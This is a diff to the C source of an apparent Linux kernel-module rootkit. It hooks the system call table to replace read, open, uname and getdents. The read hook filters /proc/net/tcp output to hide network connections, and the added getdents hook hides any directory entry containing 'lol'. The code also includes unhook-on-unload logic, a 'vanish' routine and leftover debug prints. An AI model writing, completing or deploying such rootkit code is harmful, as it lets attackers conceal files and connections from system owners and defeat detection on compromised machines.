@@ -79,7 +79,6 @@ static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
   ret = org_read(fd, buf, count);
   set_fs(old_fs);
   if (opened_fd == fd && strncmp(opened_name, "/proc/net/tcp", 13) == 0) {
-    printk("%s\n", opened_name);
     for (i = j = p = 0; i < ret; i++,j++) {
       if (buf[i] == '\n' || buf[i] == '\0') {
         line[j] = buf[i];
@@ -104,13 +103,21 @@ static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
         line[j] = buf[i];
       }
     }
-    printk("%s\n", buf);
     if (ret > 0)
       ret = p;
   }
 end:
   return ret;
 }
+
+struct linux_dirent {
+  unsigned long d_ino;
+  unsigned long d_off;
+  unsigned short d_reclen;
+  char pad;
+  char d_type;
+  char d_name[];
+};
 
 static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
     *dirp, unsigned int count) {
@@ -119,29 +126,29 @@ static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
   char* userp, *buf;
   int ret;
   mm_segment_t old_fs;
+  char name[4] = {0};
 
-  /* 
-     buf = kmalloc(count, GFP_KERNEL);
-     if (!buf)
-     return -ENOBUFS;
-     */
   old_fs = get_fs();
   set_fs(KERNEL_DS);
-  ret = org_getdents(fd, (struct linux_dirent*) dirp, count);
+  ret = org_getdents(fd,  dirp, count);
   set_fs(old_fs);
-  buf = (char*)dirp;
-
-  userp = (char *)dirp;
-  printk("%u %d", fd, ret);
-  p = (char*)(buf + sizeof(unsigned long) + sizeof(unsigned long) + sizeof(unsigned short));
-  printk(p);
-
-  if  (ret > 0)
+  buf = (char *)dirp;
+  for (i = j = 0; i < ret; i++,j++) {
+    if (i == 0)
+      printk("start\n");
+    printk("%c\n", buf[i]);
+    buf[j] = buf[i];
+    if (strncmp(buf + i, "lol", 3) == 0) {
+      printk("Found\n");
+      j -= 19;
+      i += 5;
+    }
+    if (i == ret - 1)
+      printk("end\n");
+  }
+  if (ret > 0)
     ret = j;
-
 end:
-  kfree(buf);
-
   return ret;
 }
 
@@ -217,6 +224,7 @@ static inline void memorize(void) {
   org_uname = _sys_call_table[__NR_uname];
   org_read = _sys_call_table[__NR_read];
   org_open = _sys_call_table[__NR_open];
+  org_getdents = _sys_call_table[__NR_getdents];
 }
 
 static inline void vanish(void) {
@@ -266,14 +274,16 @@ static int __init load_module(void) {
   _sys_call_table[__NR_uname] = uname;
   _sys_call_table[__NR_read] = read;
   _sys_call_table[__NR_open] = open;
+  _sys_call_table[__NR_getdents] = getdents;
   return 0;
 }
 
 // on module unload
 static void __exit cleanup(void) {
   _sys_call_table[__NR_uname] = org_uname;
-  _sys_call_table[__NR_read] = org_read;
   _sys_call_table[__NR_open] = org_open;
+  _sys_call_table[__NR_read] = org_read;
+  _sys_call_table[__NR_getdents] = org_getdents;
   set_write_permission();
   return;
 }
